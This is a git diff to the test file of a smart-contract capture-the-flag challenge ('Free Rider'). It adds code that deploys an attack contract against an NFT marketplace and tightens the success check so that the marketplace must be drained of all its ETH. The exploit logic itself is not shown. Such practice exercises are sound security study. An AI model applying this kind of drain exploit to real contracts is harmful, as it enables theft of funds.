@@ -106,6 +106,11 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        attacker = await (await ethers.getContractFactory('FreeRiderNFTMarketplaceAttack', player)).deploy(
+            marketplace.address, uniswapPair.address, devsContract.address, player.address
+        );
+
+        await attacker.attack();
     });
 
     after(async function () {
@@ -119,9 +124,11 @@ describe('[Challenge] Free Rider', function () {
 
         // Exchange must have lost NFTs and ETH
         expect(await marketplace.offersCount()).to.be.eq(0);
-        expect(
-            await ethers.provider.getBalance(marketplace.address)
-        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
+        // more difficult check: exchange must be drained of all ETH - no mercy!
+        expect(await ethers.provider.getBalance(marketplace.address)).to.be.eq(0);
+      //  expect(
+      //      await ethers.provider.getBalance(marketplace.address)
+      //  ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
 
         // Player must have earned all ETH
         expect(await ethers.provider.getBalance(player.address)).to.be.gt(BOUNTY);
